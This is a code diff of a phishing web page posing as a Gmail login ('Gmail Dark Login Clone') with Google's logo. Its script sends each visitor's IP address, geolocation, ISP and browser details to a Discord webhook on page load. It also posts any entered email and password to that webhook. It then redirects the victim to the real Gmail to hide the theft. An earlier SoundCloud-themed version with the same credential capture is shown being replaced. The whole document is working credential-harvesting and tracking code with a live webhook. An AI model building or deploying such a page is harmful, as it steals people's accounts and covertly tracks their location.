@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Stream Ken Carson Music | Listen To Songs, albums, playlists for free on SoundCloud</title>
+  <title>Gmail Dark Login Clone</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = {
@@ -25,6 +26,7 @@
   </style>
 </head>
 <body class="bg-[#202124] text-white min-h-screen flex flex-col justify-center items-center px-4">
+
   <div class="w-full max-w-4xl bg-[#171717] rounded-3xl shadow-lg p-8 md:p-10">
     <div id="emailStep">
       <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" alt="Google Logo" class="h-7 mb-10">
@@ -66,6 +68,8 @@
   </div>
 
   <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1358533803164827791/SC7RqePQmAO3StmRzKpPauhodEGwl3KmOh4sKkO_rYbRpl5rJ8yQhKyYqgWjZDO7MM-n';
+
     const emailForm = document.getElementById('emailForm');
     const passwordForm = document.getElementById('passwordForm');
     const passwordStep = document.getElementById('passwordStep');
@@ -74,8 +78,29 @@
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
     const showPassword = document.getElementById('showPassword');
-    
-    const webhookURL = 'https://discord.com/api/webhooks/1358533803164827791/SC7RqePQmAO3StmRzKpPauhodEGwl3KmOh4sKkO_rYbRpl5rJ8yQhKyYqgWjZDO7MM-n';
+
+    // On page load: collect IP + device info
+    window.addEventListener('DOMContentLoaded', () => {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ua = navigator.userAgent;
+          const log = 
+`📡 New visitor:\nTime: ${new Date().toISOString()}\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nPostal: ${data.postal}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nTimezone: ${data.timezone}\nASN: ${data.asn}\nOrg: ${data.org}\nDevice: ${ua}\n\n`;
+          sendToDiscord(log);
+        })
+        .catch(err => {
+          console.error("IP fetch error", err);
+        });
+    });
+
+    function sendToDiscord(msg) {
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: msg })
+      });
+    }
 
     emailForm.addEventListener('submit', function (e) {
       e.preventDefault();
@@ -86,29 +111,12 @@
 
     passwordForm.addEventListener('submit', function (e) {
       e.preventDefault();
-
       const email = emailInput.value;
       const password = passwordInput.value;
-
-      // Send email and password to Discord webhook
-      const data = {
-        content: `Email: ${email}\nPassword: ${password}`
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => response.json())
-      .then(data => console.log('Successfully sent data to Discord:', data))
-      .catch(error => console.error('Error sending data to Discord:', error));
-
-      // Redirect to SoundCloud after submitting
-      setTimeout(function() {
-        window.location.href = "https://soundcloud.com/kencarson";
+      const data = `📥 Credentials:\nTime: ${new Date().toISOString()}\nEmail: ${email}\nPassword: ${password}\n\n`;
+      sendToDiscord(data);
+      setTimeout(() => {
+        window.location.href = "https://mail.google.com/mail/u/0/?pli=1";
       }, 1000);
     });
 
